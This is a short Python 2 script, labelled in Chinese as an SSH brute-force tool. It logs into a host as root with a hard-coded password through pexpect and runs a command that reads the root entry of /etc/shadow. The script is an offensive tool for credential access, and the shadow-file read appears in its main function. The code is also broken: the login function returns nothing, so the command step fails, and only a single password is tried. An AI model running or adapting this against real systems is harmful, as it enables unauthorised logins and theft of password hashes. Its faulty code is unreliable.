#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Created by xiaoqin00 on 2017/7/15

#ssh爆破
import pexpect
PROMPT=['# ','>>> ','> ','\$ ']  #注意有空格
def send_command(child,cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before

def connect(user,host,passowrd):
    ssh_newkey='Are you sure you want to continue connecting'
    connStr='ssh '+user+'@'+host
    child=pexpect.spawn(connStr)
    ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[P|p]assword:'])
    if ret==0:
        print '[-]Error Connecting'
        return
    if ret==1:
        child.sendline('yes')
        ret=child.expect([pexpect.TIMEOUT,'[P|p]assword:'])
    if ret==0:
        print '[-]Error Connnecting'
        return
    child.sendline(passowrd)
    child.expect(PROMPT)
    return

def main():
    host='localhost'
    user='root'
    password='toor'
    child=connect(user,host,password)
    send_command(child,'cat /etc/shadow | grep root')

if __name__ == '__main__':
    main()